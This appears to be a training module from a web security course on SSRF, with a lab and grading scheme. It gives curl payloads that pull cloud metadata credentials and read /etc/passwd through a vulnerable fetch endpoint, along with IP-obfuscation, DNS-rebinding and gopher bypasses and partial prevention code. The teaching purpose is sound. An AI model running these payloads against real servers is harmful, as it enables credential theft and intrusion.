# Module 8 — Server-Side Request Forgery (SSRF)

**Course:** Web Application Security | **Path:** Web App Security (8 of 10)

---

## What You'll Actually Do

You'll exploit SSRF to make the server access internal resources, then fix the vulnerability.

---

## How SSRF Works

```text
Attacker sends: https://example.com/fetch?url=http://169.254.169.254/latest/meta-data/
Server fetches: http://169.254.169.254/latest/meta-data/ (cloud metadata)
Server returns: AWS credentials, instance info
```

**Targets:**
```text
Cloud metadata: http://169.254.169.254/latest/meta-data/
Internal services: http://localhost:8080/admin
Internal databases: mysql://db.internal:3306/
File system: file:///etc/passwd
```

---

## Exploitation

```bash
# Basic SSRF
curl "https://example.com/fetch?url=http://169.254.169.254/latest/meta-data/"

# Port scanning
curl "https://example.com/fetch?url=http://localhost:22"

# Read files
curl "https://example.com/fetch?url=file:///etc/passwd"
```

---

## Bypass Techniques

```text
IP obfuscation:
  2130706433 → 127.0.0.1
  0x7f000001 → 127.0.0.1
  0177.0.0.1 → 127.0.0.1
  127.1 → 127.0.0.1

DNS rebinding:
  attacker.com → resolves to 127.0.0.1 on second query

Protocol abuse:
  file:///etc/passwd
  gopher://localhost:25/
```

---

## Prevention

```python
# Block internal IPs
import ipaddress

def is_internal(url):
    ip = ipaddress.ip_address(socket.gethostbyname(urlparse(url).hostname))
    return ip.is_private or ip.is_loopback

# Allowlist URLs
ALLOWED_HOSTS = ["api.example.com", "cdn.example.com"]
if urlparse(url).hostname not in ALLOWED_HOSTS:
    abort(403)

# Disable unnecessary protocols
# Only allow http/https, not file://, gopher://
```

---

## Assessment

**Lab task (20 min):**

1. Exploit SSRF to access cloud metadata
2. Port scan internal network via SSRF
3. Read local files via SSRF
4. Try bypass techniques
5. Fix each vulnerability

**Grading:**
- SSRF exploited: 25%
- Metadata accessed: 20%
- Port scan tested: 15%
- Bypasses attempted: 15%
- Fixes correct: 25%

---

## Evidence

- **OutcomeEvidence:** `WAS-LO8 — Server-Side Request Forgery`
